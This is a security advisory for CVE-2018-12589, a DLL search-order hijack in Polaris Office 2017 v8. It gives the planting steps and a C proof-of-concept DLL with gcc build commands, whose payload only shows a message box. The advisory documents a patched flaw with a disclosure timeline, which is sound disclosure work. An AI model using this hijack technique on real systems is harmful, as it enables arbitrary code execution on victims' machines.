@@ -1,0 +1,119 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/POLARISOFFICE-2017-v8-REMOTE-CODE-EXECUTION.txt
+[+] ISR: Apparition Security          
+ 
+
+Vendor:
+=============
+www.polarisoffice.com
+
+
+Product:
+===========
+PolarisOffice 2017 v8
+
+Polaris Document Solution is an integrated solution for corporate document life cycle from document creation, use, management, security, and collaboration.
+
+Used by more than 70 million subscribers in 240 countries.
+
+
+Vulnerability Type:
+===================
+Remote Code Execution
+
+
+CVE Reference:
+==============
+CVE-2018-12589
+
+
+Security Issue:
+================
+Polaris Office 2017 8.1 allows attackers to execute arbitrary code via a Trojan horse "puiframeworkproresenu.dll" file
+in the current working directory, due to a search order flaw vulnerability.
+
+1) create a 32bit DLL named "puiframeworkproresenu.dll" 
+2) put any .PDF or .PPTX file or whatever that is configured to open in Polaris Office in same directory as the above DLL 
+3) open the document (PDF etc) then BOOM our arbitrary DLL will execute on victims system.
+
+This can be observed as well with both the DLL and a document opened from a remote share.
+
+
+
+Exploit/POC:
+=============
+
+#include <windows.h>
+
+/* hyp3rlinx */
+
+/*
+gcc -c -m32 puiframeworkproresenu.c
+gcc -shared -m32 -o puiframeworkproresenu.dll puiframeworkproresenu.o
+*/
+
+void trojanizer(){
+	 MessageBox( 0, "Continue with PWNAGE?" , "philbin :)" , MB_YESNO + MB_ICONQUESTION );
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
+	switch(fdwReason){
+		case DLL_PROCESS_ATTACH:{
+			 trojanizer();
+			break;
+		}
+		case DLL_PROCESS_DETACH:{
+			 trojanizer();
+			break;
+		}
+		case DLL_THREAD_ATTACH:{
+			 trojanizer();
+			break;
+		}
+		case DLL_THREAD_DETACH:{
+			 trojanizer();
+			break;
+		}
+	}
+	
+	return TRUE;
+}
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: June 14, 2018
+Vendor confirms vulnerability : June 19, 2018
+Mitre assigned CVE : June 20, 2018
+Vendor replied fix will be in July
+however, update was released : June 23, 2018
+Notified vendor of impending advisory : June 23, 2018
+Vendor : "glad to hear that your problem has been solved"
+June 26, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
